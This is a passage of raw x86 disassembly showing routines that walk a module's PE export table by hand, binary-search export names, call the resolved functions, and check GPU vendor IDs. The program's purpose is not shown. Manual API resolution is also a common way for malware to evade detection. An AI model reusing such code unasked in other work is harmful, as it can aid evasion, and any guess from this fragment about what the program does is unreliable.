  403aff:	85 d2                	test   %edx,%edx
  403b01:	74 06                	je     0x403b09
  403b03:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403b07:	89 0a                	mov    %ecx,(%edx)
  403b09:	85 c0                	test   %eax,%eax
  403b0b:	78 34                	js     0x403b41
  403b0d:	8b 3d 70 ee 4a 00    	mov    0x4aee70,%edi
  403b13:	e8 b4 ea ff ff       	call   0x4025cc
  403b18:	89 fa                	mov    %edi,%edx
  403b1a:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403b1d:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  403b21:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403b26:	0f 87 f3 00 00 00    	ja     0x403c1f
  403b2c:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  403b30:	01 d3                	add    %edx,%ebx
  403b32:	0f b7 c8             	movzwl %ax,%ecx
  403b35:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403b39:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403b3c:	e9 5e 01 00 00       	jmp    0x403c9f
  403b41:	31 c0                	xor    %eax,%eax
  403b43:	e9 cf 03 00 00       	jmp    0x403f17
  403b48:	e8 4f e9 ff ff       	call   0x40249c
  403b4d:	8b 54 24 08          	mov    0x8(%esp),%edx
  403b51:	89 c1                	mov    %eax,%ecx
  403b53:	8b 42 3c             	mov    0x3c(%edx),%eax
  403b56:	8b 44 02 78          	mov    0x78(%edx,%eax,1),%eax
  403b5a:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403b5e:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  403b64:	0f 87 4d 01 00 00    	ja     0x403cb7
  403b6a:	8b 4c 02 1c          	mov    0x1c(%edx,%eax,1),%ecx
  403b6e:	01 d1                	add    %edx,%ecx
  403b70:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403b74:	0f b7 4c 24 04       	movzwl 0x4(%esp),%ecx
  403b79:	2b 4c 02 10          	sub    0x10(%edx,%eax,1),%ecx
  403b7d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403b81:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403b84:	e9 ae 01 00 00       	jmp    0x403d37
  403b89:	89 7c 24 04          	mov    %edi,0x4(%esp)
  403b8d:	8b 5c 0a 18          	mov    0x18(%edx,%ecx,1),%ebx
  403b91:	8b 6c 0a 20          	mov    0x20(%edx,%ecx,1),%ebp
  403b95:	01 d5                	add    %edx,%ebp
  403b97:	31 ff                	xor    %edi,%edi
  403b99:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403ba0:	89 de                	mov    %ebx,%esi
  403ba2:	4e                   	dec    %esi
  403ba3:	eb 12                	jmp    0x403bb7
  403ba5:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  403bac:	00 00 00 00 
  403bb0:	43                   	inc    %ebx
  403bb1:	89 df                	mov    %ebx,%edi
  403bb3:	8b 54 24 08          	mov    0x8(%esp),%edx
  403bb7:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403bbb:	8d 1c 3e             	lea    (%esi,%edi,1),%ebx
  403bbe:	d1 eb                	shr    $1,%ebx
  403bc0:	8b 44 9d 00          	mov    0x0(%ebp,%ebx,4),%eax
  403bc4:	01 d0                	add    %edx,%eax
  403bc6:	83 ec 08             	sub    $0x8,%esp
  403bc9:	51                   	push   %ecx
  403bca:	50                   	push   %eax
  403bcb:	e8 e0 e6 00 00       	call   0x4122b0
  403bd0:	83 c4 10             	add    $0x10,%esp
  403bd3:	85 c0                	test   %eax,%eax
  403bd5:	78 d9                	js     0x403bb0
  403bd7:	8b 54 24 08          	mov    0x8(%esp),%edx
  403bdb:	75 c3                	jne    0x403ba0
  403bdd:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403be1:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403be5:	01 d0                	add    %edx,%eax
  403be7:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403beb:	01 d1                	add    %edx,%ecx
  403bed:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403bf1:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403bf4:	8b 74 24 40          	mov    0x40(%esp),%esi
  403bf8:	89 f1                	mov    %esi,%ecx
  403bfa:	8d 74 24 14          	lea    0x14(%esp),%esi
  403bfe:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403c02:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403c06:	03 10                	add    (%eax),%edx
  403c08:	83 ec 0c             	sub    $0xc,%esp
  403c0b:	55                   	push   %ebp
  403c0c:	ff 74 24 1c          	push   0x1c(%esp)
  403c10:	53                   	push   %ebx
  403c11:	56                   	push   %esi
  403c12:	51                   	push   %ecx
  403c13:	ff d2                	call   *%edx
  403c15:	83 c4 0c             	add    $0xc,%esp
  403c18:	31 c0                	xor    %eax,%eax
  403c1a:	e9 f8 02 00 00       	jmp    0x403f17
  403c1f:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  403c23:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403c27:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403c2b:	01 d1                	add    %edx,%ecx
  403c2d:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403c31:	31 ff                	xor    %edi,%edi
  403c33:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  403c3a:	84 00 00 00 00 00 
  403c40:	4d                   	dec    %ebp
  403c41:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403c45:	eb 10                	jmp    0x403c57
  403c47:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403c4e:	00 00 
  403c50:	45                   	inc    %ebp
  403c51:	89 ef                	mov    %ebp,%edi
  403c53:	89 da                	mov    %ebx,%edx
  403c55:	89 f0                	mov    %esi,%eax
  403c57:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403c5b:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403c5e:	d1 ed                	shr    $1,%ebp
  403c60:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c64:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403c67:	89 d3                	mov    %edx,%ebx
  403c69:	01 d1                	add    %edx,%ecx
  403c6b:	83 ec 08             	sub    $0x8,%esp
  403c6e:	89 c6                	mov    %eax,%esi
  403c70:	50                   	push   %eax
  403c71:	51                   	push   %ecx
  403c72:	e8 39 e6 00 00       	call   0x4122b0
  403c77:	83 c4 10             	add    $0x10,%esp
  403c7a:	85 c0                	test   %eax,%eax
  403c7c:	78 d2                	js     0x403c50
  403c7e:	89 da                	mov    %ebx,%edx
  403c80:	89 f0                	mov    %esi,%eax
  403c82:	75 bc                	jne    0x403c40
  403c84:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c88:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403c8c:	01 d0                	add    %edx,%eax
  403c8e:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403c92:	01 d1                	add    %edx,%ecx
  403c94:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403c98:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403c9b:	8b 74 24 40          	mov    0x40(%esp),%esi
  403c9f:	03 10                	add    (%eax),%edx
  403ca1:	83 ec 04             	sub    $0x4,%esp
  403ca4:	ff 74 24 50          	push   0x50(%esp)
  403ca8:	ff 74 24 4c          	push   0x4c(%esp)
  403cac:	56                   	push   %esi
  403cad:	ff d2                	call   *%edx
  403caf:	83 c4 04             	add    $0x4,%esp
  403cb2:	e9 5b 02 00 00       	jmp    0x403f12
  403cb7:	8b 6c 02 18          	mov    0x18(%edx,%eax,1),%ebp
  403cbb:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403cbf:	8b 5c 02 20          	mov    0x20(%edx,%eax,1),%ebx
  403cc3:	01 d3                	add    %edx,%ebx
  403cc5:	31 ff                	xor    %edi,%edi
  403cc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403cce:	00 00 
  403cd0:	89 ee                	mov    %ebp,%esi
  403cd2:	4e                   	dec    %esi
  403cd3:	eb 12                	jmp    0x403ce7
  403cd5:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  403cdc:	00 00 00 00 
  403ce0:	45                   	inc    %ebp
  403ce1:	89 ef                	mov    %ebp,%edi
  403ce3:	8b 54 24 08          	mov    0x8(%esp),%edx
  403ce7:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403ceb:	8d 2c 3e             	lea    (%esi,%edi,1),%ebp
  403cee:	d1 ed                	shr    $1,%ebp
  403cf0:	8b 04 ab             	mov    (%ebx,%ebp,4),%eax
  403cf3:	01 d0                	add    %edx,%eax
  403cf5:	83 ec 08             	sub    $0x8,%esp
  403cf8:	51                   	push   %ecx
  403cf9:	50                   	push   %eax
  403cfa:	e8 b1 e5 00 00       	call   0x4122b0
  403cff:	83 c4 10             	add    $0x10,%esp
  403d02:	85 c0                	test   %eax,%eax
  403d04:	78 da                	js     0x403ce0
  403d06:	8b 54 24 08          	mov    0x8(%esp),%edx
  403d0a:	75 c4                	jne    0x403cd0
  403d0c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403d10:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403d14:	01 d0                	add    %edx,%eax
  403d16:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403d1a:	01 d1                	add    %edx,%ecx
  403d1c:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403d20:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403d23:	8b 74 24 40          	mov    0x40(%esp),%esi
  403d27:	89 f1                	mov    %esi,%ecx
  403d29:	8d 74 24 14          	lea    0x14(%esp),%esi
  403d2d:	89 cf                	mov    %ecx,%edi
  403d2f:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403d33:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403d37:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  403d3b:	03 10                	add    (%eax),%edx
  403d3d:	83 ec 0c             	sub    $0xc,%esp
  403d40:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403d44:	50                   	push   %eax
  403d45:	ff 74 24 5c          	push   0x5c(%esp)
  403d49:	51                   	push   %ecx
  403d4a:	ff 74 24 5c          	push   0x5c(%esp)
  403d4e:	57                   	push   %edi
  403d4f:	ff d2                	call   *%edx
  403d51:	83 c4 0c             	add    $0xc,%esp
  403d54:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403d58:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  403d5c:	85 c9                	test   %ecx,%ecx
  403d5e:	74 06                	je     0x403d66
  403d60:	8b 44 24 20          	mov    0x20(%esp),%eax
  403d64:	89 01                	mov    %eax,(%ecx)
  403d66:	8b 44 24 18          	mov    0x18(%esp),%eax
  403d6a:	89 44 24 24          	mov    %eax,0x24(%esp)
  403d6e:	a1 70 ee 4a 00       	mov    0x4aee70,%eax
  403d73:	89 44 24 10          	mov    %eax,0x10(%esp)
  403d77:	e8 f0 e5 ff ff       	call   0x40236c
  403d7c:	8b 54 24 10          	mov    0x10(%esp),%edx
  403d80:	89 c1                	mov    %eax,%ecx
  403d82:	8b 42 3c             	mov    0x3c(%edx),%eax
  403d85:	8b 44 02 78          	mov    0x78(%edx,%eax,1),%eax
  403d89:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  403d8d:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  403d93:	77 1f                	ja     0x403db4
  403d95:	8b 4c 02 1c          	mov    0x1c(%edx,%eax,1),%ecx
  403d99:	01 d1                	add    %edx,%ecx
  403d9b:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403d9f:	0f b7 4c 24 08       	movzwl 0x8(%esp),%ecx
  403da4:	2b 4c 02 10          	sub    0x10(%edx,%eax,1),%ecx
  403da8:	8b 44 24 04          	mov    0x4(%esp),%eax
  403dac:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403daf:	e9 85 00 00 00       	jmp    0x403e39
  403db4:	8b 74 02 18          	mov    0x18(%edx,%eax,1),%esi
  403db8:	89 44 24 28          	mov    %eax,0x28(%esp)
  403dbc:	8b 44 02 20          	mov    0x20(%edx,%eax,1),%eax
  403dc0:	01 d0                	add    %edx,%eax
  403dc2:	89 44 24 04          	mov    %eax,0x4(%esp)
  403dc6:	31 db                	xor    %ebx,%ebx
  403dc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  403dcf:	00 
  403dd0:	89 f7                	mov    %esi,%edi
  403dd2:	4f                   	dec    %edi
  403dd3:	eb 10                	jmp    0x403de5
  403dd5:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  403ddc:	00 00 00 00 
  403de0:	46                   	inc    %esi
  403de1:	89 f3                	mov    %esi,%ebx
  403de3:	89 ea                	mov    %ebp,%edx
  403de5:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403de9:	8d 34 1f             	lea    (%edi,%ebx,1),%esi
  403dec:	d1 ee                	shr    $1,%esi
  403dee:	8b 44 24 04          	mov    0x4(%esp),%eax
  403df2:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  403df5:	89 d5                	mov    %edx,%ebp
  403df7:	01 d0                	add    %edx,%eax
  403df9:	83 ec 08             	sub    $0x8,%esp
  403dfc:	51                   	push   %ecx
  403dfd:	50                   	push   %eax
  403dfe:	e8 ad e4 00 00       	call   0x4122b0
  403e03:	83 c4 10             	add    $0x10,%esp
  403e06:	85 c0                	test   %eax,%eax
  403e08:	78 d6                	js     0x403de0
  403e0a:	89 ea                	mov    %ebp,%edx
  403e0c:	75 c2                	jne    0x403dd0
  403e0e:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403e12:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403e16:	01 d0                	add    %edx,%eax
  403e18:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403e1c:	01 d1                	add    %edx,%ecx
  403e1e:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  403e22:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403e25:	8b 74 24 40          	mov    0x40(%esp),%esi
  403e29:	89 f1                	mov    %esi,%ecx
  403e2b:	8d 74 24 14          	lea    0x14(%esp),%esi
  403e2f:	89 cf                	mov    %ecx,%edi
  403e31:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403e35:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403e39:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403e3d:	03 10                	add    (%eax),%edx
  403e3f:	83 ec 0c             	sub    $0xc,%esp
  403e42:	55                   	push   %ebp
  403e43:	51                   	push   %ecx
  403e44:	53                   	push   %ebx
  403e45:	56                   	push   %esi
  403e46:	57                   	push   %edi
  403e47:	ff d2                	call   *%edx
  403e49:	83 c4 0c             	add    $0xc,%esp
  403e4c:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  403e51:	78 2f                	js     0x403e82
  403e53:	89 fe                	mov    %edi,%esi
  403e55:	8b 3d 70 ee 4a 00    	mov    0x4aee70,%edi
  403e5b:	e8 6c e7 ff ff       	call   0x4025cc
  403e60:	89 fa                	mov    %edi,%edx
  403e62:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403e65:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  403e69:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403e6e:	77 1c                	ja     0x403e8c
  403e70:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  403e74:	01 d3                	add    %edx,%ebx
  403e76:	0f b7 c8             	movzwl %ax,%ecx
  403e79:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403e7d:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403e80:	eb 7d                	jmp    0x403eff
  403e82:	b8 05 00 00 c0       	mov    $0xc0000005,%eax
  403e87:	e9 8b 00 00 00       	jmp    0x403f17
  403e8c:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  403e90:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403e94:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403e98:	01 d1                	add    %edx,%ecx
  403e9a:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403e9e:	31 ff                	xor    %edi,%edi
  403ea0:	4d                   	dec    %ebp
  403ea1:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403ea5:	eb 10                	jmp    0x403eb7
  403ea7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403eae:	00 00 
  403eb0:	45                   	inc    %ebp
  403eb1:	89 ef                	mov    %ebp,%edi
  403eb3:	89 da                	mov    %ebx,%edx
  403eb5:	89 f0                	mov    %esi,%eax
  403eb7:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ebb:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403ebe:	d1 ed                	shr    $1,%ebp
  403ec0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403ec4:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403ec7:	89 d3                	mov    %edx,%ebx
  403ec9:	01 d1                	add    %edx,%ecx
  403ecb:	83 ec 08             	sub    $0x8,%esp
  403ece:	89 c6                	mov    %eax,%esi
  403ed0:	50                   	push   %eax
  403ed1:	51                   	push   %ecx
  403ed2:	e8 d9 e3 00 00       	call   0x4122b0
  403ed7:	83 c4 10             	add    $0x10,%esp
  403eda:	85 c0                	test   %eax,%eax
  403edc:	78 d2                	js     0x403eb0
  403ede:	89 da                	mov    %ebx,%edx
  403ee0:	89 f0                	mov    %esi,%eax
  403ee2:	75 bc                	jne    0x403ea0
  403ee4:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403ee8:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403eec:	01 d0                	add    %edx,%eax
  403eee:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403ef2:	01 d1                	add    %edx,%ecx
  403ef4:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403ef8:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403efb:	8b 74 24 40          	mov    0x40(%esp),%esi
  403eff:	03 10                	add    (%eax),%edx
  403f01:	83 ec 04             	sub    $0x4,%esp
  403f04:	ff 74 24 50          	push   0x50(%esp)
  403f08:	ff 74 24 4c          	push   0x4c(%esp)
  403f0c:	56                   	push   %esi
  403f0d:	ff d2                	call   *%edx
  403f0f:	83 c4 04             	add    $0x4,%esp
  403f12:	b8 01 00 00 00       	mov    $0x1,%eax
  403f17:	83 c4 2c             	add    $0x2c,%esp
  403f1a:	5e                   	pop    %esi
  403f1b:	5f                   	pop    %edi
  403f1c:	5b                   	pop    %ebx
  403f1d:	5d                   	pop    %ebp
  403f1e:	c3                   	ret
  403f1f:	90                   	nop
  403f20:	55                   	push   %ebp
  403f21:	53                   	push   %ebx
  403f22:	57                   	push   %edi
  403f23:	56                   	push   %esi
  403f24:	83 ec 0c             	sub    $0xc,%esp
  403f27:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  403f2b:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403f2f:	8b 35 70 ee 4a 00    	mov    0x4aee70,%esi
  403f35:	e8 82 ec ff ff       	call   0x402bbc
  403f3a:	89 f2                	mov    %esi,%edx
  403f3c:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403f3f:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403f43:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403f48:	77 19                	ja     0x403f63
  403f4a:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403f4e:	01 d7                	add    %edx,%edi
  403f50:	0f b7 c8             	movzwl %ax,%ecx
  403f53:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403f57:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403f5a:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403f5e:	e9 85 00 00 00       	jmp    0x403fe8
  403f63:	8b 6c 32 18          	mov    0x18(%edx,%esi,1),%ebp
  403f67:	89 34 24             	mov    %esi,(%esp)
  403f6a:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  403f6e:	01 d1                	add    %edx,%ecx
  403f70:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403f74:	31 ff                	xor    %edi,%edi
  403f76:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403f7d:	00 00 00 
  403f80:	4d                   	dec    %ebp
  403f81:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403f85:	eb 10                	jmp    0x403f97
  403f87:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403f8e:	00 00 
  403f90:	45                   	inc    %ebp
  403f91:	89 ef                	mov    %ebp,%edi
  403f93:	89 da                	mov    %ebx,%edx
  403f95:	89 f0                	mov    %esi,%eax
  403f97:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403f9b:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403f9e:	d1 ed                	shr    $1,%ebp
  403fa0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403fa4:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403fa7:	89 d3                	mov    %edx,%ebx
  403fa9:	01 d1                	add    %edx,%ecx
  403fab:	83 ec 08             	sub    $0x8,%esp
  403fae:	89 c6                	mov    %eax,%esi
  403fb0:	50                   	push   %eax
  403fb1:	51                   	push   %ecx
  403fb2:	e8 f9 e2 00 00       	call   0x4122b0
  403fb7:	83 c4 10             	add    $0x10,%esp
  403fba:	85 c0                	test   %eax,%eax
  403fbc:	78 d2                	js     0x403f90
  403fbe:	89 da                	mov    %ebx,%edx
  403fc0:	89 f0                	mov    %esi,%eax
  403fc2:	75 bc                	jne    0x403f80
  403fc4:	8b 0c 24             	mov    (%esp),%ecx
  403fc7:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403fcb:	01 d0                	add    %edx,%eax
  403fcd:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403fd1:	01 d1                	add    %edx,%ecx
  403fd3:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403fd7:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403fda:	8b 7c 24 20          	mov    0x20(%esp),%edi
  403fde:	89 f9                	mov    %edi,%ecx
  403fe0:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403fe4:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  403fe8:	03 10                	add    (%eax),%edx
  403fea:	83 ec 08             	sub    $0x8,%esp
  403fed:	ff 74 24 3c          	push   0x3c(%esp)
  403ff1:	ff 74 24 3c          	push   0x3c(%esp)
  403ff5:	ff 74 24 3c          	push   0x3c(%esp)
  403ff9:	55                   	push   %ebp
  403ffa:	53                   	push   %ebx
  403ffb:	51                   	push   %ecx
  403ffc:	ff d2                	call   *%edx
  403ffe:	83 c4 14             	add    $0x14,%esp
  404001:	5e                   	pop    %esi
  404002:	5f                   	pop    %edi
  404003:	5b                   	pop    %ebx
  404004:	5d                   	pop    %ebp
  404005:	c3                   	ret
  404006:	90                   	nop
  404007:	90                   	nop
  404008:	55                   	push   %ebp
  404009:	53                   	push   %ebx
  40400a:	57                   	push   %edi
  40400b:	56                   	push   %esi
  40400c:	81 ec 6c 04 00 00    	sub    $0x46c,%esp
  404012:	8b 3d 74 ee 4a 00    	mov    0x4aee74,%edi
  404018:	85 ff                	test   %edi,%edi
  40401a:	74 30                	je     0x40404c
  40401c:	e8 fb ed ff ff       	call   0x402e1c
  404021:	8b 4f 3c             	mov    0x3c(%edi),%ecx
  404024:	8b 54 0f 78          	mov    0x78(%edi,%ecx,1),%edx
  404028:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40402d:	77 24                	ja     0x404053
  40402f:	8b 74 17 1c          	mov    0x1c(%edi,%edx,1),%esi
  404033:	01 fe                	add    %edi,%esi
  404035:	0f b7 c8             	movzwl %ax,%ecx
  404038:	2b 4c 17 10          	sub    0x10(%edi,%edx,1),%ecx
  40403c:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
  40403f:	03 38                	add    (%eax),%edi
  404041:	0f 85 94 00 00 00    	jne    0x4040db
  404047:	e9 0b 01 00 00       	jmp    0x404157
  40404c:	31 db                	xor    %ebx,%ebx
  40404e:	e9 25 01 00 00       	jmp    0x404178
  404053:	8b 6c 17 18          	mov    0x18(%edi,%edx,1),%ebp
  404057:	4d                   	dec    %ebp
  404058:	89 54 24 18          	mov    %edx,0x18(%esp)
  40405c:	8b 4c 17 20          	mov    0x20(%edi,%edx,1),%ecx
  404060:	01 f9                	add    %edi,%ecx
  404062:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  404066:	31 db                	xor    %ebx,%ebx
  404068:	89 7c 24 14          	mov    %edi,0x14(%esp)
  40406c:	66 66 66 2e 0f 1f 84 	data16 data16 nopw %cs:0x0(%eax,%eax,1)
  404073:	00 00 00 00 00 
  404078:	8d 34 2b             	lea    (%ebx,%ebp,1),%esi
  40407b:	d1 ee                	shr    $1,%esi
  40407d:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404081:	8b 0c b1             	mov    (%ecx,%esi,4),%ecx
  404084:	01 f9                	add    %edi,%ecx
  404086:	89 c7                	mov    %eax,%edi
  404088:	89 44 24 04          	mov    %eax,0x4(%esp)
  40408c:	89 0c 24             	mov    %ecx,(%esp)
  40408f:	e8 1c e2 00 00       	call   0x4122b0
  404094:	85 c0                	test   %eax,%eax
  404096:	79 10                	jns    0x4040a8
  404098:	46                   	inc    %esi
  404099:	89 f3                	mov    %esi,%ebx
  40409b:	eb 10                	jmp    0x4040ad
  40409d:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  4040a4:	00 00 00 00 
  4040a8:	74 12                	je     0x4040bc
  4040aa:	4e                   	dec    %esi
  4040ab:	89 f5                	mov    %esi,%ebp
  4040ad:	89 f8                	mov    %edi,%eax
  4040af:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4040b3:	39 eb                	cmp    %ebp,%ebx
  4040b5:	76 c1                	jbe    0x404078
  4040b7:	e9 9b 00 00 00       	jmp    0x404157
  4040bc:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4040c0:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4040c4:	8b 44 0f 24          	mov    0x24(%edi,%ecx,1),%eax
  4040c8:	01 f8                	add    %edi,%eax
  4040ca:	8b 4c 0f 1c          	mov    0x1c(%edi,%ecx,1),%ecx
  4040ce:	01 f9                	add    %edi,%ecx
  4040d0:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  4040d4:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4040d7:	03 38                	add    (%eax),%edi
  4040d9:	74 7c                	je     0x404157
  4040db:	c7 04 24 20 00 00 00 	movl   $0x20,(%esp)
  4040e2:	ff d7                	call   *%edi
  4040e4:	83 ec 04             	sub    $0x4,%esp
  4040e7:	89 c6                	mov    %eax,%esi
  4040e9:	85 f6                	test   %esi,%esi
  4040eb:	74 6a                	je     0x404157
  4040ed:	8b 06                	mov    (%esi),%eax
  4040ef:	89 34 24             	mov    %esi,(%esp)
  4040f2:	ff 50 10             	call   *0x10(%eax)
  4040f5:	83 ec 04             	sub    $0x4,%esp
  4040f8:	85 c0                	test   %eax,%eax
  4040fa:	74 57                	je     0x404153
  4040fc:	31 ff                	xor    %edi,%edi
  4040fe:	8d 5c 24 20          	lea    0x20(%esp),%ebx
  404102:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  404108:	8b 06                	mov    (%esi),%eax
  40410a:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  40410e:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404112:	89 34 24             	mov    %esi,(%esp)
  404115:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40411c:	00 
  40411d:	ff 50 14             	call   *0x14(%eax)
  404120:	83 ec 10             	sub    $0x10,%esp
  404123:	85 c0                	test   %eax,%eax
  404125:	78 1c                	js     0x404143
  404127:	8b 84 24 48 04 00 00 	mov    0x448(%esp),%eax
  40412e:	3d 02 10 00 00       	cmp    $0x1002,%eax
  404133:	74 26                	je     0x40415b
  404135:	3d 86 80 00 00       	cmp    $0x8086,%eax
  40413a:	74 1f                	je     0x40415b
  40413c:	3d de 10 00 00       	cmp    $0x10de,%eax
  404141:	74 18                	je     0x40415b
  404143:	47                   	inc    %edi
  404144:	8b 06                	mov    (%esi),%eax
  404146:	89 34 24             	mov    %esi,(%esp)
  404149:	ff 50 10             	call   *0x10(%eax)
  40414c:	83 ec 04             	sub    $0x4,%esp
  40414f:	39 c7                	cmp    %eax,%edi
  404151:	72 b5                	jb     0x404108
  404153:	31 db                	xor    %ebx,%ebx
  404155:	eb 06                	jmp    0x40415d
  404157:	31 db                	xor    %ebx,%ebx
  404159:	eb 0d                	jmp    0x404168
  40415b:	b3 01                	mov    $0x1,%bl
  40415d:	8b 06                	mov    (%esi),%eax
  40415f:	89 34 24             	mov    %esi,(%esp)
